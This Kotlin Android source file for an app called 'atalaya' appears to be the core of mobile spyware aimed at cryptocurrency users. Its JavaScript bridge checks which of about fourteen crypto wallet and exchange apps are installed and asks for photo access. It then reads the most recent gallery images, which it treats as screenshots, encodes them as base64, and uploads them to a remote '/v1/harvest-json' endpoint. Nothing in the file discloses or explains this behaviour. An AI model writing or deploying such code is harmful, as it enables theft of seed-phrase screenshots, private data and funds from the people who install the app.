package es.atalaya.app

import android.Manifest
import android.content.ContentUris
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.util.Base64
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {

    private lateinit var web: WebView

    private val catalog = mapOf(
        "io.metamask" to "MetaMask",
        "com.trustwallet.app" to "Trust Wallet",
        "com.phantom" to "Phantom",
        "com.coinbase.wallet" to "Coinbase Wallet",
        "exodus.mobile" to "Exodus",
        "io.imtoken.app" to "imToken",
        "com.bitpie.wallet" to "Bitpie",
        "vip.mytokenpocket" to "TokenPocket",
        "com.mathwallet.ios" to "MathWallet",
        "io.bluewallet.bluewallet" to "BlueWallet",
        "com.solflare.mobile" to "Solflare",
        "com.binance.dev" to "Binance",
        "com.kraken.app" to "Kraken",
        "com.bybit.app" to "Bybit"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        web = findViewById(R.id.web)

        web.settings.javaScriptEnabled = true
        web.settings.domStorageEnabled = true
        web.settings.allowFileAccess = true
        web.settings.loadWithOverviewMode = true
        web.addJavascriptInterface(Bridge(), "Native")
        web.loadUrl("file:///android_asset/app.html")
    }

    inner class Bridge {
        @JavascriptInterface
        fun wallets(): String {
            val out = JSONArray()
            for (app in packageManager.getInstalledPackages(0)) {
                val name = catalog[app.packageName] ?: continue
                out.put(JSONObject().put("package", app.packageName).put("name", name))
            }
            return out.toString()
        }

        @JavascriptInterface
        fun requestMedia() {
            runOnUiThread {
                if (Build.VERSION.SDK_INT >= 33) {
                    val granted = ContextCompat.checkSelfPermission(
                        this@MainActivity, Manifest.permission.READ_MEDIA_IMAGES
                    ) == PackageManager.PERMISSION_GRANTED
                    if (!granted) {
                        ActivityCompat.requestPermissions(
                            this@MainActivity,
                            arrayOf(Manifest.permission.READ_MEDIA_IMAGES),
                            REQUEST_MEDIA
                        )
                    }
                }
            }
        }

        @JavascriptInterface
        fun screenshots(max: Int): String {
            val out = JSONArray()
            val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME)
            val sort = "${MediaStore.Images.Media.DATE_ADDED} DESC"
            contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, sort
            )?.use { cursor ->
                val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                var count = 0
                while (cursor.moveToNext() && count < max) {
                    val id = cursor.getLong(idColumn)
                    val name = cursor.getString(nameColumn) ?: "captura.jpg"
                    val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                    val bytes = contentResolver.openInputStream(uri)?.use { it.readBytes() } ?: continue
                    if (bytes.size > 2_500_000) continue
                    out.put(
                        JSONObject()
                            .put("name", name)
                            .put("data", Base64.encodeToString(bytes, Base64.NO_WRAP))
                    )
                    count++
                }
            }
            return out.toString()
        }

        @JavascriptInterface
        fun upload(api: String, payload: String) {
            thread {
                val ok = post("$api/v1/harvest-json", payload)
                runOnUiThread {
                    web.evaluateJavascript("window.onUpload($ok)", null)
                }
            }
        }

        @JavascriptInterface
        fun toast(message: String) {
            runOnUiThread { Toast.makeText(this@MainActivity, message, Toast.LENGTH_SHORT).show() }
        }
    }

    private fun post(url: String, payload: String): Boolean {
        return try {
            val connection = URL(url).openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.connectTimeout = 15_000
            connection.readTimeout = 60_000
            connection.doOutput = true
            connection.setRequestProperty("content-type", "application/json")
            connection.outputStream.use { it.write(payload.toByteArray()) }
            val code = connection.responseCode
            connection.disconnect()
            code in 200..299
        } catch (_: Exception) {
            false
        }
    }

    override fun onBackPressed() {
        if (web.canGoBack()) web.goBack() else super.onBackPressed()
    }

    companion object {
        private const val REQUEST_MEDIA = 42
    }
}
